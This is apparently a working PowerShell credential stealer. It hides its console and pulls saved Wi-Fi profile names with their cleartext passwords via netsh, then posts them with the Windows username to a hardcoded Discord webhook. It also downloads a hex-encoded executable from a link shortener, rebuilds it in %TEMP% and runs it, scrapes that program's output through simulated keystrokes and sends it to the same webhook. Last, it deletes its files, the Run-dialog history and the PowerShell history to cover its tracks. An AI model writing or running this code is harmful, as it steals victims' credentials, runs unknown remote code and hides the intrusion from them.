# Discord webhook URL
$webhookUrl = 'https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'

# ##############################################################################
# Add C# code to define the ConsoleWindow class
Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class ConsoleWindow {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;

        public static void Hide() {
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, SW_HIDE);
        }

        public static void Show() {
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, SW_SHOW);
        }
    }
"@

# Hide the console window
[ConsoleWindow]::Hide()

# Redirect both standard output and error to null
$null = Start-Transcript -Path "$env:TEMP\Ain1_log.txt" -Append

###############################################################################

try {
    # Extract Wi-Fi profiles
    netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
        $wlan = $_.Matches.Value
        
        # Extract the Wi-Fi password
        try {
            $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
        } catch {
            #Write-Host "Failed to retrieve password for $wlan"
            $passw = "N/A" # Assign a placeholder if password retrieval fails
        }

        # Build the message body for the webhook
        $Body = @{
            'username' = $env:username + " | " + [string]$wlan
            'content'  = [string]$passw
        }

        # Send the data to the Discord webhook
        try {
            Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
        } catch {
            #Write-Host "Failed to send data to Discord webhook"
        }
    }
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show('Netsh checked!', 'Notification')
} catch {
    #Write-Host "An error occurred: $($_.Exception.Message)"
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show("An error occurred: $($_.Exception.Message)", 'Error')
}

###############################################################################

# DOWNLOAD PROGRAM in HEX CODE (%TEMP%)

$url = "https://lnkfwd.com/u/Kpj_Yric"  # Define the URL of the file to be downloaded
$tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
Invoke-WebRequest -Uri $url -OutFile $tempPath # Use Invoke-WebRequest to download the file

###############################################################################

# OPEN THE PROGRAM BY CONVERTING HEX TO EXE AND RUN IN THE MEMORY

$hexFilePath = Join-Path $env:TEMP "example.txt" # Path to the hex file in the %temp% directory
$hexString = Get-Content -Path $hexFilePath -Raw # Read the hex string from the file

# Convert the hex string to a byte array
$bytes = [byte[]]::new($hexString.Length / 2)
for ($i = 0; $i -lt $hexString.Length; $i += 2) {
    $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
}

# Create a temporary file to hold the executable
$tempExePath = Join-Path $env:TEMP "example.exe"
[System.IO.File]::WriteAllBytes($tempExePath, $bytes)

$process = Start-Process $tempExePath # Start the executable

###############################################################################

# EXTRACT DATA 

$outputFilePath = "$env:TEMP\data.txt"
Start-Sleep -Seconds 2 # Wait a moment for the application to fully load
Add-Type -AssemblyName System.Windows.Forms # Load the necessary assemblies for sending keys

# Simulate CTRL+A and then CTRL+S to save the file
[System.Windows.Forms.SendKeys]::SendWait("^(a)")  # Simulate CTRL+A
Start-Sleep -Milliseconds 500  # Wait a moment for selection
[System.Windows.Forms.SendKeys]::SendWait("^(s)")  # Simulate CTRL+S
Start-Sleep -Milliseconds 1000  # Wait for save dialog to appear

# Send the output file path and Enter
[System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
Start-Sleep -Milliseconds 500  # Wait for the input
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save

Start-Sleep -Seconds 2 # Wait a moment for the file to save
Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes

###########################################################################

# SEND TO DISCORD

$filePath = "$env:TEMP\data.txt" # Define the path to the text file using the TEMP environment variable

# Check if the file exists
if (Test-Path $filePath) {
    # Read the content of the text file
    $fileContent = Get-Content -Path $filePath -Raw

    # Split the content into chunks of 2000 characters
    $chunkSize = 2000
    $chunks = [System.Collections.Generic.List[string]]::new()

    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
        $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
    }

    # Send each chunk to the Discord webhook
    foreach ($chunk in $chunks) {
        [ConsoleWindow]::Hide()
        # Create the payload for the webhook
        $payload = @{
            content = $chunk
        } | ConvertTo-Json

        # Try to send the content to the Discord webhook
        try {
            [ConsoleWindow]::Hide()
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
            Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
        } catch {
            #Write-Host "Error sending request: $_"
            Add-Type -AssemblyName PresentationFramework
            [System.Windows.MessageBox]::Show("Error sending request: $_", 'Error')
        }
    }
} else {
    #Write-Host "File not found: $filePath"
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show("File not found: $filePath", 'Error')
}

# End the transcript if you started one
Stop-Transcript

Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue

#delete the entire history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Clear the PowerShell command history
Clear-History


# Display a message box indicating completion
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('Creds Checked!', 'Notification')